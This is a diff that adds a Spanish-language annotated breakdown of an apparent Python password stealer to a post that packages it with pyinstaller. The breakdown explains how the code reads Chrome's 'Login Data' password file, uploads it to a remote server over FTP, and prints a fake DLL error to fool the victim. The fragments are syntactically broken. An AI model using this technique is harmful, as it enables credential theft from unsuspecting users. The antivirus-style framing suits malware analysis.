@@ -162,3 +162,29 @@ Quote:
 pyinstaller -F 'file name'
 
 The information is provided for informational purposes only!
+
+
+##########################################################################
+
+Desglosando el FILE y como un antivirus lo ve:
+
+import os.path        # Alerta: ¿Va a buscar archivos en el sistema?
+import getpass        # Alerta: ¿Quiere saber quién es el usuario?
+from ftplib import FTP # ROJA: ¡Este programa va a sacar archivos por internet!
+import random         # Neutral: Se usa para nombres de archivos.
+
+
+# El programa construye la ruta hacia las contraseñas de Chrome
+dir_pass_google = "C: \ Users" + UserName + "\ AppData \ Local \ Google \ Chrome \ User Data \ Default \ Login Data"
+
+# Aquí es donde el antivirus ve el intento de "exfiltración" (sacar los datos de la PC).
+with open (dir_pass_google, "rb") as content:         // open(..., "rb"): Está abriendo tu base de datos de contraseñas en modo lectura binaria.
+
+   con.storbinary ("STOR% s"% filename2, content)  // con.storbinary: Está enviando ese archivo a un servidor remoto.
+
+
+# Para que el usuario no sospeche, el código imprime esto:
+
+print ("Error library import HOUII.dll") 
+
+
